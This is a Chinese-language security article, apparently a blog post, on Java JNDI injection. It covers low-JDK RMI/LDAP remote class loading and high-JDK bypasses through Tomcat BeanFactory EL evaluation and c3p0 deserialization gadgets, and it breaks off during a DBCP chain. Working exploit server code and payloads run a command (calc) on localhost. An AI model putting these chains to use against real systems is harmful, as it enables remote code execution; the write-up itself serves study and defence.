#  JNDI注入攻防全解析：从低版本RCE到高版本绕过分析  
原创 尘佑不尘
                    尘佑不尘  泷羽Sec-尘宇安全   2026-03-16 13:09  
  
# 低版本注入  
  
先来复习一下jndi注入  
## rmi  
  
先准备一个恶意类编译成class  
```
//package JNDI;import java.lang.Runtime;public class test{    static {        try{            Runtime.getRuntime().exec("calc");        }catch (Exception e){            System.out.println(e);        }    }    public  test(){}}
```  
  
本地起一个python服务  
  
服务端代码：绑定恶意class文件  
```
import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer {    public static void main(String[] args) throws Exception{        Registry registry= LocateRegistry.createRegistry(7777);        Reference reference = new Reference("test", "test", "http://localhost/");        ReferenceWrapper wrapper = new ReferenceWrapper(reference);        registry.bind("calc", wrapper);    }}
```  
  
客户端代码：  
```
package JNDI;import com.mchange.v2.naming.JavaBeanObjectFactory;import javax.naming.InitialContext;public class JNDI_Test {    public static void main(String[] args) throws Exception{        new InitialContext().lookup("rmi://127.0.0.1:7777/calc");    }}
```  
  
先运行服务端代码，再允许客户端  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7YFEuwHnDgHnU2SeVxBOJ5pB5Pw5rogmq9713m4tytKb5QAvFxxLphhfPoaCb1tGE0ic6p5eribQ6QlIF9M5X6jjs0UuBia6J4lc/640?wx_fmt=png&from=appmsg "")  
  
接下来分析漏洞  
  
从RegistryContext.lookup方法开始跟  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4aHGAHj0sKpA5HhAPsIcjASic6FpWNYWFIy3OwEMEQB9CVEic67NbsVW4qrkaw4jRic4rPkZ7icWOFRdDu6nNKm1OTFVD0E1yoyHE/640?wx_fmt=png&from=appmsg "")  
  
继续跟decodeObject  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7Ena7ajn7nggfMXx9bBENBPXB5eaJB0HiaPmMUbnVianzCODZLrWBrBPicxe9KYBmV2KmVSleVviaSqtfHysQd0ibL9hxoT7k2r36Q/640?wx_fmt=png&from=appmsg "")  
  
继续跟getObjectInstance方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5S635RzyxoDBh8xC3ImsE7bxFCV7XODxvxDa0hqibLg4tg6tfEDkxDXwwjrUicog3XRrib5Wl6Zwovicib7oWuR27wqs0TSUQXOkF8/640?wx_fmt=png&from=appmsg "")  
  
跟进这个方法  
  
此处clas = helper.loadClass(factoryName);  
尝试从本地加载Factory  
类，如果不存在本地不存在此类，则会从codebase  
中加载：clas = helper.loadClass(factoryName, codebase);  
会从远程加载我们恶意class，然后在return  
那里return (clas != null) ? (ObjectFactory) clas.newInstance() : null;  
对我们的恶意类进行一个实例化，进而加载我们的恶意代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4D8YgLn3fGLg1edVjNZicZYdpxA9J9DzlzHOztbk0VgvsxP1kD8oJZ0ySJBEcI6d3SDLIPAvY5tsB4icFIv9icdVftcH0Pjn5XIY/640?wx_fmt=png&from=appmsg "")  
  
由于test类不是我们本地类就会远程加载  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd57CjTiahyNmZbSVUDDN9kqh3c84t2ZG6OSohbamR1B7Wmr6c39rzia4drjJRg6OZN4JfibMUaab4SBehzM2YhdmS5Kic8A1iaYM944/640?wx_fmt=png&from=appmsg "")  
  
跟进loadclass  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5gywQ5Hd0bSic8fiau4ckCIibHq5dvSicmkWsDa7xe6nf3zl43IssNfVTVfgfic8xXPDpJd4tt8Jq6kpcJsmFfcNlGibPzlgzjXHegM/640?wx_fmt=png&from=appmsg "")  
  
直接Class.forName并传入了true，所以这里会做初始化，如果我们在恶意类里面的相关命令执行的代码写到的是初始化模块里面，则在这里就会触发了，如果是在构造方法里面写的相关命令执行的代码则是在newInstance里面触发。  
  
调用栈  
```
loadClass:73, VersionHelper12 (com.sun.naming.internal)loadClass:61, VersionHelper12 (com.sun.naming.internal)getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)getObjectInstance:319, NamingManager (javax.naming.spi)decodeObject:464, RegistryContext (com.sun.jndi.rmi.registry)lookup:124, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, JNDI_Test (JNDI)
```  
## ldap  
  
直接yakit起一个服务端  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7HvMQ8xtV451WNya9ibWDicpconEiaZHNfzcyQALmbgLPDso5UBdQ2qZhADX3Ylw5YZRPJicKP7L3KnibWkFfR28wHf5E4o4Mq1bFc/640?wx_fmt=png&from=appmsg "")  
  
客户端代码：  
```
package JNDI;import com.mchange.v2.naming.JavaBeanObjectFactory;import javax.naming.InitialContext;public class JNDI_Test {    public static void main(String[] args) throws Exception{        new InitialContext().lookup("ldap://127.0.0.1:8085/ecEzwVXo");    }}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5zPwCnfdURbGIaAIz9k2wU0Sg3ib26RBic6WvL21Sxucic7neQFY84rnCf6fxnZr2GmwZbcQCLAoRMyDhcB8MkCiaQWZsjswnSv3E/640?wx_fmt=png&from=appmsg "")  
  
接下来进行漏洞分析  
```
调用了一个DirectoryManager.getObjectInstance 类似于NamingManager.getobjectInstance
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7L6BwpvlANq6GiboCusiaRKY0ao3OsljPESgHXeclMicEpSrMnwd0dXUqHIZiabjfeHxJg6s8vBnf1SqubichyO6WlJHibEkSJ5wgQY/640?wx_fmt=png&from=appmsg "")  
  
由于不是本地类就要远程加载  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4QYqibPjLof5Fk2d5IjSEwkU7JqBgazNdiaeB84VDhJ3cNsAXscZP4c83wibu9PC2Px4eNatg5d8fX1ib3zqUVuSWptvlFcy6dqco/640?wx_fmt=png&from=appmsg "")  
```
loadClass:72, VersionHelper12 (com.sun.naming.internal)loadClass:61, VersionHelper12 (com.sun.naming.internal)getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)getObjectInstance:189, DirectoryManager (javax.naming.spi)c_lookup:1085, LdapCtx (com.sun.jndi.ldap)p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:417, InitialContext (javax.naming)main:9, JNDI_Test (JNDI)
```  
# 高版本的限制  
  
decodeObject加了一个if判断  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd54VRAAZEYHSfcicFv185jbfvia8GObEkPbKXia5maaAmaiciaqOUKycJ3Y0QWa2dTdINKibbql7c39BicQXc7GMibJlwtWk0u0icm7UDM8/640?wx_fmt=png&from=appmsg "")  
  
**绕过方法**  
  
我们的目的就是能够成功的 调用NamingManager.getObjectInstance  
  
因为这里会调用本地工厂的getObjectInstance方法，如果本地getObjectInstance方法里面存在恶意方法，就可以实现rce  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd5R92SvLNNLticgqnQlGT6nzsqX8Qich34AtKzNu4siaCH5HfxmP8537WGGu06aAPpheJZ7ZJzMZ1e4eEa6FsoQxGUkKfOibibs8CXQ/640?wx_fmt=png&from=appmsg "")  
  
不抛出异常的话就是  
  
1、令 ref 为空  
  
2、令 ref.GetFactoryClassLocation() 为空  
  
3、令 trustURLCodebase 为 true  
  
主要使用第二种方法  
  
Ref.GetFactoryClassLocation() 返回空，让 ref 对象的 classFactoryLocation 属性为空，这个属性表示引用所指向对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址(可以是多个地址，以空格分隔)，这正是我们针对低版本的利用方法；如果对应的 factory 是本地代码，则该值为空，这是绕过高版本 JDK 限制的关键  
## BeanFactory  
  
利用本地的类进行利用，对于本地的类也是有要求的，这个类必须是个工厂类，该工厂类型必须实现javax.naming.spi.ObjectFactory 接口，因为在javax.naming.spi.NamingManager[#getObjectFactoryFromReference最后的return语句对工厂类的实例对象进行了类型转换return]()  
 (clas != null) ? (ObjectFactory) clas.newInstance() : null;；并且该工厂类至少存在一个 getObjectInstance() 方法  
  
org.apache.naming.factory.BeanFactory  
，并且该类存在于Tomcat依赖包  
  
添加依赖  
```
<dependency>    <groupId>org.apache.tomcat</groupId>    <artifactId>tomcat-catalina</artifactId>    <version>8.5.0</version></dependency><dependency>    <groupId>org.apache.el</groupId>    <artifactId>com.springsource.org.apache.el</artifactId>    <version>7.0.26</version></dependency>
```  
  
服务端代码  
```
package JNDI;import com.sun.jndi.rmi.registry.ReferenceWrapper;import org.apache.naming.ResourceRef;import javax.naming.StringRefAddr;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer {    public static void main(String[] args) throws Exception{                Registry registry = LocateRegistry.createRegistry(7777);        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);        ref.add(new StringRefAddr("forceString", "x=eval"));        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);        registry.bind("calc", referenceWrapper);    }}
```  
  
客户端代码  
```
package JNDI;import com.mchange.v2.naming.JavaBeanObjectFactory;import javax.naming.InitialContext;public class JNDI_Test {    public static void main(String[] args) throws Exception{        new InitialContext().lookup("rmi://127.0.0.1:7777/calc");    }}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7cyn9LHuUEolwhPaXqbXsRtzAMyeo1iagsFJYQmQ644C8s30SH3opBpS04rQ5t45Z6zgLcIasEps8LBicF1J7nXo6Io50Lu1uNY/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析  
  
这里使用的是本地工厂类，所以可以直接走到NamingManager.getObjectInstance  
并且成功获取到了工厂类，调用了它的getObjectInstance方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5Nb21Tpu3pQZYSnyoy2lXgFICQ76Q506WRUuuMH1eWY1pCWGA4C560he9Qz8f68ew3XTwDiad5waUXHK5gy0PicnkgezT9TCZGM/640?wx_fmt=png&from=appmsg "")  
  
这里实现了一个el表达式的反射调用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5tk2USzALLapcHmIu6okc0LTibdmrh9pLuRsBicFmwXr4DduKHv0rXCfS7U2nkf2TyAaZXU5PcaEoM6tboD45N7KqLE90ax1YtU/640?wx_fmt=png&from=appmsg "")  
## JavaBeanObjectFactory  
  
JavaBeanObjectFactory类是c3p0包下的  
  
导入依赖  
```
<dependency>    <groupId>com.mchange</groupId>    <artifactId>c3p0</artifactId>    <version>0.9.5.2</version></dependency>
```  
  
先来看它的getobjectInstance方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd4zGvicXOvOC4RV6VX4cQMqMkMe8eyrGWxCVJCdhRWwyWIgdNAN1DYcu05Cm3gJs3QlSgwBe7PXltcjze1f7NMZKObvZeXG1Gco/640?wx_fmt=png&from=appmsg "")  
```
public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable var4) throws Exception {    if (!(var1 instanceof Reference)) {        return null;    } else {        Reference var5 = (Reference)var1;        HashMap var6 = new HashMap();        Enumeration var7 = var5.getAll();        while(var7.hasMoreElements()) {            RefAddr var8 = (RefAddr)var7.nextElement();            var6.put(var8.getType(), var8);        }        Class var11 = Class.forName(var5.getClassName());        Set var12 = null;        BinaryRefAddr var9 = (BinaryRefAddr)var6.remove("com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY");        if (var9 != null) {            var12 = (Set)SerializableUtils.fromByteArray((byte[])((byte[])var9.getContent()));        }        Map var10 = this.createPropertyMap(var11, var6);        return this.findBean(var11, var10, var12);    }}
```  
  
先看SerializableUtils.fromByteArray方法，当传入的属性中包含键值com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY时才会走到  
```
refProps = (Set) SerializableUtils.fromByteArray( (byte[]) refPropsRefAddr.getContent() );
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7IUyWoAFVaWwXoQZcMXFwPvgErpCwS5SXnI3K3Q2FRNScvTWR8LpcQqjvLrLLBlQ6q4Bp44osJgDJwmIGmgu4aLJxKQ8eDJKA/640?wx_fmt=png&from=appmsg "")  
```
public static Object fromByteArray(byte[] var0) throws IOException, ClassNotFoundException {    Object var1 = deserializeFromByteArray(var0);    return var1 instanceof IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1;}
```  
  
跟进一下deserializeFromByteArray方法，发现这里进行了一个反序列化操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd6C8FpiaXsgvicAdRNXwwJAN1C0ablR8weSqumqib474gQET0UV4gI70QGLNtcZwWKbD3wddD6RChYnLribSbkq3b8JQO9txok2dmQ/640?wx_fmt=png&from=appmsg "")  
  
接下来就可以构造了  
```
public static void main(String[] args) throws Exception {Reference ref = new Reference("java.lang.Object",        "com.mchange.v2.naming.JavaBeanObjectFactory",null);ref.add(new BinaryRefAddr("com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY",Utils.base64ToByte("base64序列化字节")));  Registry registry = LocateRegistry.createRegistry(7777);ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);registry.bind("calc", referenceWrapper);}
```  
  
同理createPropertyMap  
方法中也存在反序列化点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7xiauC6OtPaiaay4sI2DoXz5lE22znJEk2xgicbNicFlNIAcsxTLRTSKPwSDE5RiaEOCNib9ZXmyDwweSCLHqVic2HMQA9HmJKPDSX4I/640?wx_fmt=png&from=appmsg "")  
  
里面也有一个SerializableUtils.fromByteArray方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5GTm4YfbJIs0mLOwyLlrwdHiboMdSEvhtXwKEqb6xEYXSnCLWjX16hib8gOS74YN2a57rqhHk4wztDLox6qyAEog7kCJFsGnMy0/640?wx_fmt=png&from=appmsg "")  
  
构造也和上面类似  
  
再看看findbean方法，功能主要是调用setter方法，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7pvBe8sicvnNnibHYILJiciabQ3VSHeIjyleEvMmFaqH9BDW8oODzXPjQ6omnoeE8moiak6ZYF7ElHzqtBX7yRIAst3KYkhRLKiazY8/640?wx_fmt=png&from=appmsg "")  
  
先回顾一下c3p0里面的HEX序列化字节加载器进行反序列化攻击，直接看setter方法  
  
这里有个判断大概意思就是userOverridesAsString和传入的 hex 字节码做比较，肯定不相等，然后往下看 VetoableChangeSupport.FireVetoableChange  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd6wrLjepRc7LHpVAxhj1iamwMib719B7Qo0fnpXfZpJ5d7YuXDGlia9GswVdH76k4kjrvBYsNbbodrTvWzAkNae0L9oOTq1ZkNxI0/640?wx_fmt=png&from=appmsg "")  
  
继续跟  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd59gfQJzZDte99j1AmEEegEvVvdVUZwwZUicNsHFuiaO47X5kmPtfAjia9E3miabFKmMmo0wDmU9SpGU5REuBwssUkjEicClt2Bia6Ks/640?wx_fmt=png&from=appmsg "")  
  
重点分析这段代码  
```
public void fireVetoableChange(PropertyChangeEvent event)        throws PropertyVetoException {    Object oldValue = event.getOldValue();    Object newValue = event.getNewValue();    if (oldValue == null || newValue == null || !oldValue.equals(newValue)) {        String name = event.getPropertyName();        VetoableChangeListener[] common = this.map.get(null);        VetoableChangeListener[] named = (name != null)                    ? this.map.get(name)                    : null;        VetoableChangeListener[] listeners;        if (common == null) {            listeners = named;        }        elseif (named == null) {            listeners = common;        }        else {            listeners = new VetoableChangeListener[common.length + named.length];            System.arraycopy(common, 0, listeners, 0, common.length);            System.arraycopy(named, 0, listeners, common.length, named.length);        }        if (listeners != null) {            int current = 0;            try {                while (current < listeners.length) {                    listeners[current].vetoableChange(event);                    current++;                }            }            catch (PropertyVetoException veto) {                event = new PropertyChangeEvent(this.source, name, newValue, oldValue);                for (int i = 0; i < current; i++) {                    try {                        listeners[i].vetoableChange(event);                    }                    catch (PropertyVetoException exception) {                        // ignore exceptions that occur during rolling back                    }                }                throw veto; // rethrow the veto exception            }        }    }}
```  
  
这里主要为 listeners 赋值为 common，if (listeners != null)判断成立，进入 listeners[current].vetoableChange(event);  
 也就是**WrapperConnectionPoolDataSource.VetoableChange 方法**  
  
最终会走到这里  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd5zyGzks7aWicdXNfu6ssgxDOoUiclec96aOUVR6aCu9ic001TV6D78TXtVNtJBibwA6hHzHlUiav4npib1u8XHMLP5waRhCp13YXgvk/640?wx_fmt=png&from=appmsg "")  
  
然后对传入的hex字节进行反序列化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd65YbiaiadttFnicfLmZibn3eT8auCDhUJKvbrfjwgBR8o2iaVcmDTXiacNic3zHwbSPZ5ZibEbWp34Bdb0WxNxjuuEf7H1j2yJYl25iar8/640?wx_fmt=png&from=appmsg "")  
  
调试分析一下  
  
这里过了if，往下跟  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd5QqTAxpk6OvVrG8LD4icdUSZmPuBLiaJVvsLhlTfylpSMp5icx37bRhRffBErE7yzUQUQaD9iaB9fJcJC0UpABWu5rBIEN7JsJzNM/640?wx_fmt=png&from=appmsg "")  
  
走到**WrapperConnectionPoolDataSource.VetoableChange 方法**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd5PCcmUhWY4zO0Dgg8lkEjuvOdAMC85MqHDhVtQLUUG9XQojLMdiav9XxiccSic3AsCiaz0h5qTwE75sc59xXZY07j4wnud6a2rLRc/640?wx_fmt=png&from=appmsg "")  
  
这里的propName=userOverridesAsString，所以就会走到parseUserOverridesAsString方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd67beJ4VTyEs2uva8IYwPiawicjIku37wpiaH9H1Y6BmiaRmy2xLwjRUGeWDIvL2V6gdWTcvOlicmNCLaHkRVibGs3iaYjRVIiblDOHEFg/640?wx_fmt=png&from=appmsg "")  
  
这里的userOverridesAsString就是传入的恶意hex  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4nZqJQtODQQLmY71P78IchSRQpTVAHQQr1bTsxXjyfI1kujPNDoz3QoPPtP7vvqzBpICRssqyaWB4YibhL9ILEricH4PajFlgDU/640?wx_fmt=png&from=appmsg "")  
  
接下来反序列化  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7bjqzB8cB45Haz5agMqpffgKwopqKibgs69xWGkPEYMyKaOjRAXGcZw10CQW6LWnLw7FhR9oIpCsDzXxAV3XwKxO30b2eSibrKs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd5qAAaiaCL6uoKyYoiabaEEdoAbMPYXF6gUWTW0vDfQTrwANFJM02jbFaenN4S7FS0Y6T3VzeNeAicqMGzChSJ5ml2Ig2X75kHD4c/640?wx_fmt=png&from=appmsg "")  
  
成功触发  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd43jhzXotMdMcbReeQdDUw8icLTAKROCvyAFRz6GSJF1iaqJd7fo2uzia4cajc7UGW83I0r0WlLbxOciaeSeSU7IeQia98YpbkrStSQ/640?wx_fmt=png&from=appmsg "")  
  
所以构造如下  
```
    Reference ref = new Reference("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",            "com.mchange.v2.naming.JavaBeanObjectFactory", null);    String poc = "";     ref.add(new StringRefAddr("userOverridesAsString", "HexAsciiSerializedMap:" + poc+";"));    Registry registry = LocateRegistry.createRegistry(7777);    ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);    registry.bind("calc", referenceWrapper);
```  
## 调试分析  
  
这里的classFactoryLocation 属性为空，绕过了if判断  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd4ysAE3ouUfaj4CmoVYlSSBLxdaGeMSqBV6twb3ibEkLFzI1uNFx9uOsxbsXRMqPE9diaMe138aRXTnbicjKZ9xxbLibU3QchckjUY/640?wx_fmt=png&from=appmsg "")  
  
返回了本地工厂类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7kakAsYAMp2ialWR9ubhm107Ce4hxHTIwf8SxDlhgCicwFNatHQhk653ic1M6Uwgztn415WHOunjwVXXh0ew9WFs0xg7icK1wFUCw/640?wx_fmt=png&from=appmsg "")  
  
接着进入findbean方法里面调用传入的setter方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5F2jyVFQMsxOM7cM404Wkt78Heiaexgib0Dtd2YEeLguz06pwYUL32icrhV06d7EoKB2ABREe0JNcCrWftURGe32knia2OucWWUJQ/640?wx_fmt=png&from=appmsg "")  
  
最终调用栈：  
```
deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser)fromByteArray:123, SerializableUtils (com.mchange.v2.ser)parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)fireVetoableChange:375, VetoableChangeSupport (java.beans)fireVetoableChange:271, VetoableChangeSupport (java.beans)setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)findBean:146, JavaBeanObjectFactory (com.mchange.v2.naming)getObjectInstance:72, JavaBeanObjectFactory (com.mchange.v2.naming)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:14, JNDI_Test (JNDI)
```  
## FactoryBase  
  
环境搭建  
```
<dependencies>    <dependency>        <groupId>org.javassist</groupId>        <artifactId>javassist</artifactId>        <version>3.25.0-GA</version>    </dependency>      <dependency>          <groupId>org.apache.commons</groupId>          <artifactId>commons-dbcp2</artifactId>          <version>2.12.0</version>      </dependency>      <dependency>          <groupId>org.apache.tomcat</groupId>          <artifactId>tomcat-catalina</artifactId>          <version>9.0.89</version> <!-- 或与你使用的 Tomcat 版本一致 -->      </dependency>      <dependency>          <groupId>org.apache.tomcat</groupId>          <artifactId>tomcat-dbcp</artifactId>          <version>9.0.89</version>      </dependency>      <dependency>          <groupId>mysql</groupId>          <artifactId>mysql-connector-java</artifactId>          <version>8.0.19</version>      </dependency>      <dependency>          <groupId>commons-collections</groupId>          <artifactId>commons-collections</artifactId>          <version>3.2.1</version>      </dependency>  </dependencies>
```  
  
绕过分析  
  
由于这是个抽象类无法实例化，这里找到它的实现类ResourceFactory  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7j1graH2YfiaS3Y6sfRW4GWsklgWiaCJvrKdhMYLd3oYE3gpb9MK8HGUYOyEsZkgZZJUM2PXq3LEqpow2YRHicaT7FUemDVqiaHBE/640?wx_fmt=png&from=appmsg "")  
  
先来看下这个类的getObjectInstance() 方法，注解写的很清楚了  
```
public final Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {    // 检查传入的 JNDI 对象 (obj) 是否是该工厂支持的 Reference 类型。    // 在 Tomcat 中，isReferenceTypeSupported(obj) 会检查 obj 是否是 ResourceRef 的实例，    if (this.isReferenceTypeSupported(obj)) {                // 类型转换与链接检查        Reference ref = (Reference)obj;        // 尝试从 Reference 中获取已存在的/链接的对象。        // 如果资源已经被初始化或是一个LinkRef，这里会返回非空对象。        Object linked = this.getLinked(ref);                if (linked != null) {            // 如果已链接/已存在，则直接返回。            return linked;        } else {                        //获取或创建 ObjectFactory 实例            ObjectFactory factory = null;                        // 检查 Reference 中是否指定了自定义工厂            // 尝试获取 Reference 中名为 "factory" 的地址内容 (RefAddr)。            RefAddr factoryRefAddr = ref.get("factory");                        if (factoryRefAddr != null) {                                // 如果 Reference 中指定了 'factory' 地址，则加载用户自定义的工厂类。                                String factoryClassName = factoryRefAddr.getContent().toString()；                ClassLoader tcl = Thread.currentThread().getContextClassLoader();                Class<?> factoryClass = null;                NamingException ex;                                // 加载工厂类                try {                    if (tcl != null) {                                                factoryClass = tcl.loadClass(factoryClassName);                    } else {                                                factoryClass = Class.forName(factoryClassName);                    }                } catch (ClassNotFoundException var14) {                    。                    ClassNotFoundException e = var14;                    ex = new NamingException("Could not load resource factory class");                    ex.initCause(e);                    throw ex;                }                                // 实例化工厂对象                try {                                        factory = (ObjectFactory)factoryClass.newInstance();                } catch (Throwable var15) {                                        Throwable t = var15;                                                            if (t instanceof NamingException) {                        throw (NamingException)t;                    }                    if (t instanceof ThreadDeath) {                        throw (ThreadDeath)t;                    }                    if (t instanceof VirtualMachineError) {                        throw (VirtualMachineError)t;                    }                                                            ex = new NamingException("Could not create resource factory instance");                    ex.initCause(t);                    throw ex;                }            } else {                factory = this.getDefaultFactory(ref);//获取工厂            }                        // 调用工厂方法并返回结果                        if (factory != null) {                // 如果成功获取了工厂实例，则调用该工厂自身的 getObjectInstance() 方法，                                return factory.getObjectInstance(obj, name, nameCtx, environment);            } else {                // 既没有自定义工厂，也没有默认工厂可用于该资源。                throw new NamingException("Cannot create resource instance");            }        }    } else {        return null;    }}
```  
  
先来看看它怎么获取工厂的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd6d6CZVNPSMfjSFTmajF7KdJYMYxMicQIPVC1xiaMUtftPqASadNNZkywahcstjGKesJo7TcjyJITHfh7wUfqUF5SjoDialoSTEnY/640?wx_fmt=png&from=appmsg "")  
  
判断ClassName是不是javax.sql.DataSource,如果是的话就获取org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7piaeZmJXU6wdgbaOv0cbVokdIia6mUGpIKSlIkY50MNtWGYBqzE2xDCpWk8UGWATM4CxrCuDMv7sAIRicw5zHCZp0WCXiaw9vzmI/640?wx_fmt=png&from=appmsg "")  
```
并且在这里又调用了org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory方法里面的getObjectInstance() 方法
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7kyoftzarsDTgg9AYgMQFAEGiaoEOuYTDPvviapmD1FanSCbVzrsjS2qS7TNyyAcZECeXH4FuJ64OxtAyGyHiaas4zKMk2Edhk80/640?wx_fmt=png&from=appmsg "")  
  
接着看getObjectInstance() 方法  
```
public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {    if (obj != null && obj instanceof Reference) {        Reference ref = (Reference)obj;        if (!"javax.sql.DataSource".equals(ref.getClassName())) {            return null;        } else {            List<String> warnings = new ArrayList();            List<String> infoMessages = new ArrayList();            this.validatePropertyNames(ref, name, warnings, infoMessages);            Iterator i$ = warnings.iterator();            String infoMessage;            while(i$.hasNext()) {                infoMessage = (String)i$.next();                log.warn(infoMessage);            }            i$ = infoMessages.iterator();            while(i$.hasNext()) {                infoMessage = (String)i$.next();                log.info(infoMessage);            }            Properties properties = new Properties();            String[] arr$ = ALL_PROPERTIES;            int len$ = arr$.length;            for(int i$ = 0; i$ < len$; ++i$) {                String propertyName = arr$[i$];                RefAddr ra = ref.get(propertyName);                if (ra != null) {                    String propertyValue = ra.getContent().toString();                    properties.setProperty(propertyName, propertyValue);                }            }            return createDataSource(properties);        }    } else {        return null;    }}
```  
  
这里发起了一个jdbc连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7HMb7MIKfmLcic5K3meFy8licvpJEVg7RR59EicnAmMBBbLyFpzzdgiaQ8aQWC0cf4CicFDpApCEzGI1CJvLTH06LhtqQBvXtb6Xzg/640?wx_fmt=png&from=appmsg "")  
  
所以这里的Poc构造需要为ResourceRef类型  
```
